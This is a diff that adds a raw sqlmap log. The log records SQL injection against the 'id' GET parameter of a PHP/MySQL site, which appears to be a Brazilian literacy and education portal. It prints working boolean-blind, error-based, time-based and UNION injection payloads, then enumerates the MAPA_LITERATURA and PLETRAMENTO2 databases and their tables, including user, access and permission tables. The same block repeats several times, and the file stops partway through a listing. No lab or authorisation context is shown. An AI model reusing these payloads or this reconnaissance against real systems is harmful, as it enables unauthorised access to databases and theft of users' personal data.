@@ -1,0 +1,857 @@
+sqlmap identified the following injection point(s) with a total of 62 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=14 AND 9837=9837
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=14 AND (SELECT 6618 FROM(SELECT COUNT(*),CONCAT(0x7170787071,(SELECT (ELT(6618=6618,1))),0x71766b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=14 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 10 columns
+    Payload: id=14 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170787071,0x52775979704b6b7475716c534d4442446c5267766773707641796b634f747351555059746272566e,0x71766b6271),NULL-- vGkh
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.6.31, Apache 2.4.27
+back-end DBMS: MySQL >= 5.0
+available databases [3]:
+[*] INFORMATION_SCHEMA
+[*] MAPA_LITERATURA
+[*] PLETRAMENTO2
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=14 AND 9837=9837
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=14 AND (SELECT 6618 FROM(SELECT COUNT(*),CONCAT(0x7170787071,(SELECT (ELT(6618=6618,1))),0x71766b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=14 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 10 columns
+    Payload: id=14 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170787071,0x52775979704b6b7475716c534d4442446c5267766773707641796b634f747351555059746272566e,0x71766b6271),NULL-- vGkh
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.6.31, Apache 2.4.27
+back-end DBMS: MySQL >= 5.0
+available databases [3]:
+[*] INFORMATION_SCHEMA
+[*] MAPA_LITERATURA
+[*] PLETRAMENTO2
+
+Database: MAPA_LITERATURA
+[90 tables]
++---------------------------------------------------------------+
+| INFORMATION_SCHEMADAYGUUCHARACTER_SETS                        |
+| INFORMATION_SCHEMADAYGUUCOLLATIONS                            |
+| INFORMATION_SCHEMADAYGUUCOLLATION_CHARACTER_SET_APPLICABILITY |
+| INFORMATION_SCHEMADAYGUUCOLUMNS                               |
+| INFORMATION_SCHEMADAYGUUCOLUMN_PRIVILEGES                     |
+| INFORMATION_SCHEMADAYGUUENGINES                               |
+| INFORMATION_SCHEMADAYGUUEVENTS                                |
+| INFORMATION_SCHEMADAYGUUFILES                                 |
+| INFORMATION_SCHEMADAYGUUGLOBAL_STATUS                         |
+| INFORMATION_SCHEMADAYGUUGLOBAL_VARIABLES                      |
+| INFORMATION_SCHEMADAYGUUINNODB_BUFFER_PAGE                    |
+| INFORMATION_SCHEMADAYGUUINNODB_BUFFER_PAGE_LRU                |
+| INFORMATION_SCHEMADAYGUUINNODB_BUFFER_POOL_STATS              |
+| INFORMATION_SCHEMADAYGUUINNODB_CMP                            |
+| INFORMATION_SCHEMADAYGUUINNODB_CMPMEM                         |
+| INFORMATION_SCHEMADAYGUUINNODB_CMPMEM_RESET                   |
+| INFORMATION_SCHEMADAYGUUINNODB_CMP_RESET                      |
+| INFORMATION_SCHEMADAYGUUINNODB_LOCKS                          |
+| INFORMATION_SCHEMADAYGUUINNODB_LOCK_WAITS                     |
+| INFORMATION_SCHEMADAYGUUINNODB_TRX                            |
+| INFORMATION_SCHEMADAYGUUKEY_COLUMN_USAGE                      |
+| INFORMATION_SCHEMADAYGUUPARAMETERS                            |
+| INFORMATION_SCHEMADAYGUUPARTITIONS                            |
+| INFORMATION_SCHEMADAYGUUPLUGINS                               |
+| INFORMATION_SCHEMADAYGUUPROCESSLIST                           |
+| INFORMATION_SCHEMADAYGUUPROFILING                             |
+| INFORMATION_SCHEMADAYGUUREFERENTIAL_CONSTRAINTS               |
+| INFORMATION_SCHEMADAYGUUROUTINES                              |
+| INFORMATION_SCHEMADAYGUUSCHEMATA                              |
+| INFORMATION_SCHEMADAYGUUSCHEMA_PRIVILEGES                     |
+| INFORMATION_SCHEMADAYGUUSESSION_STATUS                        |
+| INFORMATION_SCHEMADAYGUUSESSION_VARIABLES                     |
+| INFORMATION_SCHEMADAYGUUSTATISTICS                            |
+| INFORMATION_SCHEMADAYGUUTABLES                                |
+| INFORMATION_SCHEMADAYGUUTABLESPACES                           |
+| INFORMATION_SCHEMADAYGUUTABLE_CONSTRAINTS                     |
+| INFORMATION_SCHEMADAYGUUTABLE_PRIVILEGES                      |
+| INFORMATION_SCHEMADAYGUUTRIGGERS                              |
+| INFORMATION_SCHEMADAYGUUUSER_PRIVILEGES                       |
+| INFORMATION_SCHEMADAYGUUVIEWS                                 |
+| MAPA_LITERATURADAYGUULINGUAGEM_GENERO                         |
+| MAPA_LITERATURADAYGUUNIVEL_ESCOLARIDADE                       |
+| MAPA_LITERATURADAYGUUOBRA                                     |
+| MAPA_LITERATURADAYGUUOBRA_LEITOR                              |
+| MAPA_LITERATURADAYGUUOBRA_LEITOR_NIVEL_ESCOLARIDADE           |
+| MAPA_LITERATURADAYGUUOBRA_NIVEL_ESCOLARIDADE                  |
+| MAPA_LITERATURADAYGUUPUBLICO_ALVO                             |
+| MAPA_LITERATURADAYGUUREGIAO                                   |
+| MAPA_LITERATURADAYGUUTEMATICA                                 |
+| MAPA_LITERATURADAYGUUUSUARIO                                  |
+| PLETRAMENTO2DAYGUUACESSO                                      |
+| PLETRAMENTO2DAYGUUCIDADE                                      |
+| PLETRAMENTO2DAYGUUCIDADE_REGIAO                               |
+| PLETRAMENTO2DAYGUUCIDADE_UF                                   |
+| PLETRAMENTO2DAYGUUCONTATO                                     |
+| PLETRAMENTO2DAYGUUDICA_LETRADA_CATEGORIA                      |
+| PLETRAMENTO2DAYGUUFAQ                                         |
+| PLETRAMENTO2DAYGUUFAVORITO                                    |
+| PLETRAMENTO2DAYGUUFAVORITO_CLIQUES                            |
+| PLETRAMENTO2DAYGUUFORUM                                       |
+| PLETRAMENTO2DAYGUUFORUM_HISTORICO                             |
+| PLETRAMENTO2DAYGUUFORUM_MODERADOR                             |
+| PLETRAMENTO2DAYGUUFORUM_TOPICO                                |
+| PLETRAMENTO2DAYGUUFORUM_TOPICO_MENSAGEM                       |
+| PLETRAMENTO2DAYGUUFORUM_TOPICO_MENSAGEM_MENSAGEM              |
+| PLETRAMENTO2DAYGUUFORUM_TOPICO_NOTIFICACAO                    |
+| PLETRAMENTO2DAYGUUMOODLE_CATEGORIA                            |
+| PLETRAMENTO2DAYGUUMOODLE_INSCRICAO                            |
+| PLETRAMENTO2DAYGUUMOODLE_TURMA                                |
+| PLETRAMENTO2DAYGUUMURAL                                       |
+| PLETRAMENTO2DAYGUUMURAL_QUESTAO                               |
+| PLETRAMENTO2DAYGUUMURAL_RESPOSTA                              |
+| PLETRAMENTO2DAYGUUNEWSLETTER                                  |
+| PLETRAMENTO2DAYGUUPAIS                                        |
+| PLETRAMENTO2DAYGUUPARCEIRO                                    |
+| PLETRAMENTO2DAYGUUPOSTAGEM                                    |
+| PLETRAMENTO2DAYGUUPOSTAGEM_ACESSO                             |
+| PLETRAMENTO2DAYGUUPOSTAGEM_ARQUIVO                            |
+| PLETRAMENTO2DAYGUUPOSTAGEM_COMENTARIO                         |
+| PLETRAMENTO2DAYGUUPOSTAGEM_DESTAQUE                           |
+| PLETRAMENTO2DAYGUUPOSTAGEM_HISTORICO                          |
+| PLETRAMENTO2DAYGUUPOSTAGEM_NOTIFICACAO                        |
+| PLETRAMENTO2DAYGUUPOSTAGEM_TIPO                               |
+| PLETRAMENTO2DAYGUUPROJETO                                     |
+| PLETRAMENTO2DAYGUUPROJETO_FOTO                                |
+| PLETRAMENTO2DAYGUUUSUARIO                                     |
+| PLETRAMENTO2DAYGUUUSUARIO_ACESSO                              |
+| PLETRAMENTO2DAYGUUUSUARIO_INSCRICAO_OFICINA                   |
+| PLETRAMENTO2DAYGUUUSUARIO_PERFIL                              |
+| PLETRAMENTO2DAYGUUUSUARIO_PERMISSAO                           |
++---------------------------------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=14 AND 9837=9837
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=14 AND (SELECT 6618 FROM(SELECT COUNT(*),CONCAT(0x7170787071,(SELECT (ELT(6618=6618,1))),0x71766b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=14 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 10 columns
+    Payload: id=14 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170787071,0x52775979704b6b7475716c534d4442446c5267766773707641796b634f747351555059746272566e,0x71766b6271),NULL-- vGkh
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.6.31, Apache 2.4.27
+back-end DBMS: MySQL >= 5.0
+No tables found
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=14 AND 9837=9837
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=14 AND (SELECT 6618 FROM(SELECT COUNT(*),CONCAT(0x7170787071,(SELECT (ELT(6618=6618,1))),0x71766b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=14 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 10 columns
+    Payload: id=14 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170787071,0x52775979704b6b7475716c534d4442446c5267766773707641796b634f747351555059746272566e,0x71766b6271),NULL-- vGkh
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.6.31, Apache 2.4.27
+back-end DBMS: MySQL >= 5.0
+available databases [3]:
+[*] INFORMATION_SCHEMA
+[*] MAPA_LITERATURA
+[*] PLETRAMENTO2
+
+Database: MAPA_LITERATURA
+[90 tables]
++---------------------------------------------------------------+
+| INFORMATION_SCHEMADAYGUUCHARACTER_SETS                        |
+| INFORMATION_SCHEMADAYGUUCOLLATIONS                            |
+| INFORMATION_SCHEMADAYGUUCOLLATION_CHARACTER_SET_APPLICABILITY |
+| INFORMATION_SCHEMADAYGUUCOLUMNS                               |
+| INFORMATION_SCHEMADAYGUUCOLUMN_PRIVILEGES                     |
+| INFORMATION_SCHEMADAYGUUENGINES                               |
+| INFORMATION_SCHEMADAYGUUEVENTS                                |
+| INFORMATION_SCHEMADAYGUUFILES                                 |
+| INFORMATION_SCHEMADAYGUUGLOBAL_STATUS                         |
+| INFORMATION_SCHEMADAYGUUGLOBAL_VARIABLES                      |
+| INFORMATION_SCHEMADAYGUUINNODB_BUFFER_PAGE                    |
+| INFORMATION_SCHEMADAYGUUINNODB_BUFFER_PAGE_LRU                |
+| INFORMATION_SCHEMADAYGUUINNODB_BUFFER_POOL_STATS              |
+| INFORMATION_SCHEMADAYGUUINNODB_CMP                            |
+| INFORMATION_SCHEMADAYGUUINNODB_CMPMEM                         |
+| INFORMATION_SCHEMADAYGUUINNODB_CMPMEM_RESET                   |
+| INFORMATION_SCHEMADAYGUUINNODB_CMP_RESET                      |
+| INFORMATION_SCHEMADAYGUUINNODB_LOCKS                          |
+| INFORMATION_SCHEMADAYGUUINNODB_LOCK_WAITS                     |
+| INFORMATION_SCHEMADAYGUUINNODB_TRX                            |
+| INFORMATION_SCHEMADAYGUUKEY_COLUMN_USAGE                      |
+| INFORMATION_SCHEMADAYGUUPARAMETERS                            |
+| INFORMATION_SCHEMADAYGUUPARTITIONS                            |
+| INFORMATION_SCHEMADAYGUUPLUGINS                               |
+| INFORMATION_SCHEMADAYGUUPROCESSLIST                           |
+| INFORMATION_SCHEMADAYGUUPROFILING                             |
+| INFORMATION_SCHEMADAYGUUREFERENTIAL_CONSTRAINTS               |
+| INFORMATION_SCHEMADAYGUUROUTINES                              |
+| INFORMATION_SCHEMADAYGUUSCHEMATA                              |
+| INFORMATION_SCHEMADAYGUUSCHEMA_PRIVILEGES                     |
+| INFORMATION_SCHEMADAYGUUSESSION_STATUS                        |
+| INFORMATION_SCHEMADAYGUUSESSION_VARIABLES                     |
+| INFORMATION_SCHEMADAYGUUSTATISTICS                            |
+| INFORMATION_SCHEMADAYGUUTABLES                                |
+| INFORMATION_SCHEMADAYGUUTABLESPACES                           |
+| INFORMATION_SCHEMADAYGUUTABLE_CONSTRAINTS                     |
+| INFORMATION_SCHEMADAYGUUTABLE_PRIVILEGES                      |
+| INFORMATION_SCHEMADAYGUUTRIGGERS                              |
+| INFORMATION_SCHEMADAYGUUUSER_PRIVILEGES                       |
+| INFORMATION_SCHEMADAYGUUVIEWS                                 |
+| MAPA_LITERATURADAYGUULINGUAGEM_GENERO                         |
+| MAPA_LITERATURADAYGUUNIVEL_ESCOLARIDADE                       |
+| MAPA_LITERATURADAYGUUOBRA                                     |
+| MAPA_LITERATURADAYGUUOBRA_LEITOR                              |
+| MAPA_LITERATURADAYGUUOBRA_LEITOR_NIVEL_ESCOLARIDADE           |
+| MAPA_LITERATURADAYGUUOBRA_NIVEL_ESCOLARIDADE                  |
+| MAPA_LITERATURADAYGUUPUBLICO_ALVO                             |
+| MAPA_LITERATURADAYGUUREGIAO                                   |
+| MAPA_LITERATURADAYGUUTEMATICA                                 |
+| MAPA_LITERATURADAYGUUUSUARIO                                  |
+| PLETRAMENTO2DAYGUUACESSO                                      |
+| PLETRAMENTO2DAYGUUCIDADE                                      |
+| PLETRAMENTO2DAYGUUCIDADE_REGIAO                               |
+| PLETRAMENTO2DAYGUUCIDADE_UF                                   |
+| PLETRAMENTO2DAYGUUCONTATO                                     |
+| PLETRAMENTO2DAYGUUDICA_LETRADA_CATEGORIA                      |
+| PLETRAMENTO2DAYGUUFAQ                                         |
+| PLETRAMENTO2DAYGUUFAVORITO                                    |
+| PLETRAMENTO2DAYGUUFAVORITO_CLIQUES                            |
+| PLETRAMENTO2DAYGUUFORUM                                       |
+| PLETRAMENTO2DAYGUUFORUM_HISTORICO                             |
+| PLETRAMENTO2DAYGUUFORUM_MODERADOR                             |
+| PLETRAMENTO2DAYGUUFORUM_TOPICO                                |
+| PLETRAMENTO2DAYGUUFORUM_TOPICO_MENSAGEM                       |
+| PLETRAMENTO2DAYGUUFORUM_TOPICO_MENSAGEM_MENSAGEM              |
+| PLETRAMENTO2DAYGUUFORUM_TOPICO_NOTIFICACAO                    |
+| PLETRAMENTO2DAYGUUMOODLE_CATEGORIA                            |
+| PLETRAMENTO2DAYGUUMOODLE_INSCRICAO                            |
+| PLETRAMENTO2DAYGUUMOODLE_TURMA                                |
+| PLETRAMENTO2DAYGUUMURAL                                       |
+| PLETRAMENTO2DAYGUUMURAL_QUESTAO                               |
+| PLETRAMENTO2DAYGUUMURAL_RESPOSTA                              |
+| PLETRAMENTO2DAYGUUNEWSLETTER                                  |
+| PLETRAMENTO2DAYGUUPAIS                                        |
+| PLETRAMENTO2DAYGUUPARCEIRO                                    |
+| PLETRAMENTO2DAYGUUPOSTAGEM                                    |
+| PLETRAMENTO2DAYGUUPOSTAGEM_ACESSO                             |
+| PLETRAMENTO2DAYGUUPOSTAGEM_ARQUIVO                            |
+| PLETRAMENTO2DAYGUUPOSTAGEM_COMENTARIO                         |
+| PLETRAMENTO2DAYGUUPOSTAGEM_DESTAQUE                           |
+| PLETRAMENTO2DAYGUUPOSTAGEM_HISTORICO                          |
+| PLETRAMENTO2DAYGUUPOSTAGEM_NOTIFICACAO                        |
+| PLETRAMENTO2DAYGUUPOSTAGEM_TIPO                               |
+| PLETRAMENTO2DAYGUUPROJETO                                     |
+| PLETRAMENTO2DAYGUUPROJETO_FOTO                                |
+| PLETRAMENTO2DAYGUUUSUARIO                                     |
+| PLETRAMENTO2DAYGUUUSUARIO_ACESSO                              |
+| PLETRAMENTO2DAYGUUUSUARIO_INSCRICAO_OFICINA                   |
+| PLETRAMENTO2DAYGUUUSUARIO_PERFIL                              |
+| PLETRAMENTO2DAYGUUUSUARIO_PERMISSAO                           |
++---------------------------------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=14 AND 9837=9837
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=14 AND (SELECT 6618 FROM(SELECT COUNT(*),CONCAT(0x7170787071,(SELECT (ELT(6618=6618,1))),0x71766b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=14 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 10 columns
+    Payload: id=14 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170787071,0x52775979704b6b7475716c534d4442446c5267766773707641796b634f747351555059746272566e,0x71766b6271),NULL-- vGkh
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.6.31, Apache 2.4.27
+back-end DBMS: MySQL >= 5.0
+available databases [3]:
+[*] INFORMATION_SCHEMA
+[*] MAPA_LITERATURA
+[*] PLETRAMENTO2
+
+Database: MAPA_LITERATURA
+[90 tables]
++---------------------------------------------------------------+
+| INFORMATION_SCHEMADAYGUUCHARACTER_SETS                        |
+| INFORMATION_SCHEMADAYGUUCOLLATIONS                            |
+| INFORMATION_SCHEMADAYGUUCOLLATION_CHARACTER_SET_APPLICABILITY |
+| INFORMATION_SCHEMADAYGUUCOLUMNS                               |
+| INFORMATION_SCHEMADAYGUUCOLUMN_PRIVILEGES                     |
+| INFORMATION_SCHEMADAYGUUENGINES                               |
+| INFORMATION_SCHEMADAYGUUEVENTS                                |
+| INFORMATION_SCHEMADAYGUUFILES                                 |
+| INFORMATION_SCHEMADAYGUUGLOBAL_STATUS                         |
+| INFORMATION_SCHEMADAYGUUGLOBAL_VARIABLES                      |
+| INFORMATION_SCHEMADAYGUUINNODB_BUFFER_PAGE                    |
+| INFORMATION_SCHEMADAYGUUINNODB_BUFFER_PAGE_LRU                |
+| INFORMATION_SCHEMADAYGUUINNODB_BUFFER_POOL_STATS              |
+| INFORMATION_SCHEMADAYGUUINNODB_CMP                            |
+| INFORMATION_SCHEMADAYGUUINNODB_CMPMEM                         |
+| INFORMATION_SCHEMADAYGUUINNODB_CMPMEM_RESET                   |
+| INFORMATION_SCHEMADAYGUUINNODB_CMP_RESET                      |
+| INFORMATION_SCHEMADAYGUUINNODB_LOCKS                          |
+| INFORMATION_SCHEMADAYGUUINNODB_LOCK_WAITS                     |
+| INFORMATION_SCHEMADAYGUUINNODB_TRX                            |
+| INFORMATION_SCHEMADAYGUUKEY_COLUMN_USAGE                      |
+| INFORMATION_SCHEMADAYGUUPARAMETERS                            |
+| INFORMATION_SCHEMADAYGUUPARTITIONS                            |
+| INFORMATION_SCHEMADAYGUUPLUGINS                               |
+| INFORMATION_SCHEMADAYGUUPROCESSLIST                           |
+| INFORMATION_SCHEMADAYGUUPROFILING                             |
+| INFORMATION_SCHEMADAYGUUREFERENTIAL_CONSTRAINTS               |
+| INFORMATION_SCHEMADAYGUUROUTINES                              |
+| INFORMATION_SCHEMADAYGUUSCHEMATA                              |
+| INFORMATION_SCHEMADAYGUUSCHEMA_PRIVILEGES                     |
+| INFORMATION_SCHEMADAYGUUSESSION_STATUS                        |
+| INFORMATION_SCHEMADAYGUUSESSION_VARIABLES                     |
+| INFORMATION_SCHEMADAYGUUSTATISTICS                            |
+| INFORMATION_SCHEMADAYGUUTABLES                                |
+| INFORMATION_SCHEMADAYGUUTABLESPACES                           |
+| INFORMATION_SCHEMADAYGUUTABLE_CONSTRAINTS                     |
+| INFORMATION_SCHEMADAYGUUTABLE_PRIVILEGES                      |
+| INFORMATION_SCHEMADAYGUUTRIGGERS                              |
+| INFORMATION_SCHEMADAYGUUUSER_PRIVILEGES                       |
+| INFORMATION_SCHEMADAYGUUVIEWS                                 |
+| MAPA_LITERATURADAYGUULINGUAGEM_GENERO                         |
+| MAPA_LITERATURADAYGUUNIVEL_ESCOLARIDADE                       |
+| MAPA_LITERATURADAYGUUOBRA                                     |
+| MAPA_LITERATURADAYGUUOBRA_LEITOR                              |
+| MAPA_LITERATURADAYGUUOBRA_LEITOR_NIVEL_ESCOLARIDADE           |
+| MAPA_LITERATURADAYGUUOBRA_NIVEL_ESCOLARIDADE                  |
+| MAPA_LITERATURADAYGUUPUBLICO_ALVO                             |
+| MAPA_LITERATURADAYGUUREGIAO                                   |
+| MAPA_LITERATURADAYGUUTEMATICA                                 |
+| MAPA_LITERATURADAYGUUUSUARIO                                  |
+| PLETRAMENTO2DAYGUUACESSO                                      |
+| PLETRAMENTO2DAYGUUCIDADE                                      |
+| PLETRAMENTO2DAYGUUCIDADE_REGIAO                               |
+| PLETRAMENTO2DAYGUUCIDADE_UF                                   |
+| PLETRAMENTO2DAYGUUCONTATO                                     |
+| PLETRAMENTO2DAYGUUDICA_LETRADA_CATEGORIA                      |
+| PLETRAMENTO2DAYGUUFAQ                                         |
+| PLETRAMENTO2DAYGUUFAVORITO                                    |
+| PLETRAMENTO2DAYGUUFAVORITO_CLIQUES                            |
+| PLETRAMENTO2DAYGUUFORUM                                       |
+| PLETRAMENTO2DAYGUUFORUM_HISTORICO                             |
+| PLETRAMENTO2DAYGUUFORUM_MODERADOR                             |
+| PLETRAMENTO2DAYGUUFORUM_TOPICO                                |
+| PLETRAMENTO2DAYGUUFORUM_TOPICO_MENSAGEM                       |
+| PLETRAMENTO2DAYGUUFORUM_TOPICO_MENSAGEM_MENSAGEM              |
+| PLETRAMENTO2DAYGUUFORUM_TOPICO_NOTIFICACAO                    |
+| PLETRAMENTO2DAYGUUMOODLE_CATEGORIA                            |
+| PLETRAMENTO2DAYGUUMOODLE_INSCRICAO                            |
+| PLETRAMENTO2DAYGUUMOODLE_TURMA                                |
+| PLETRAMENTO2DAYGUUMURAL                                       |
+| PLETRAMENTO2DAYGUUMURAL_QUESTAO                               |
+| PLETRAMENTO2DAYGUUMURAL_RESPOSTA                              |
+| PLETRAMENTO2DAYGUUNEWSLETTER                                  |
+| PLETRAMENTO2DAYGUUPAIS                                        |
+| PLETRAMENTO2DAYGUUPARCEIRO                                    |
+| PLETRAMENTO2DAYGUUPOSTAGEM                                    |
+| PLETRAMENTO2DAYGUUPOSTAGEM_ACESSO                             |
+| PLETRAMENTO2DAYGUUPOSTAGEM_ARQUIVO                            |
+| PLETRAMENTO2DAYGUUPOSTAGEM_COMENTARIO                         |
+| PLETRAMENTO2DAYGUUPOSTAGEM_DESTAQUE                           |
+| PLETRAMENTO2DAYGUUPOSTAGEM_HISTORICO                          |
+| PLETRAMENTO2DAYGUUPOSTAGEM_NOTIFICACAO                        |
+| PLETRAMENTO2DAYGUUPOSTAGEM_TIPO                               |
+| PLETRAMENTO2DAYGUUPROJETO                                     |
+| PLETRAMENTO2DAYGUUPROJETO_FOTO                                |
+| PLETRAMENTO2DAYGUUUSUARIO                                     |
+| PLETRAMENTO2DAYGUUUSUARIO_ACESSO                              |
+| PLETRAMENTO2DAYGUUUSUARIO_INSCRICAO_OFICINA                   |
+| PLETRAMENTO2DAYGUUUSUARIO_PERFIL                              |
+| PLETRAMENTO2DAYGUUUSUARIO_PERMISSAO                           |
++---------------------------------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=14 AND 9837=9837
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=14 AND (SELECT 6618 FROM(SELECT COUNT(*),CONCAT(0x7170787071,(SELECT (ELT(6618=6618,1))),0x71766b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=14 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 10 columns
+    Payload: id=14 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170787071,0x52775979704b6b7475716c534d4442446c5267766773707641796b634f747351555059746272566e,0x71766b6271),NULL-- vGkh
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.6.31, Apache 2.4.27
+back-end DBMS: MySQL >= 5.0
+available databases [3]:
+[*] INFORMATION_SCHEMA
+[*] MAPA_LITERATURA
+[*] PLETRAMENTO2
+
+Database: MAPA_LITERATURA
+[90 tables]
++---------------------------------------------------------------+
+| INFORMATION_SCHEMADAYGUUCHARACTER_SETS                        |
+| INFORMATION_SCHEMADAYGUUCOLLATIONS                            |
+| INFORMATION_SCHEMADAYGUUCOLLATION_CHARACTER_SET_APPLICABILITY |
+| INFORMATION_SCHEMADAYGUUCOLUMNS                               |
+| INFORMATION_SCHEMADAYGUUCOLUMN_PRIVILEGES                     |
+| INFORMATION_SCHEMADAYGUUENGINES                               |
+| INFORMATION_SCHEMADAYGUUEVENTS                                |
+| INFORMATION_SCHEMADAYGUUFILES                                 |
+| INFORMATION_SCHEMADAYGUUGLOBAL_STATUS                         |
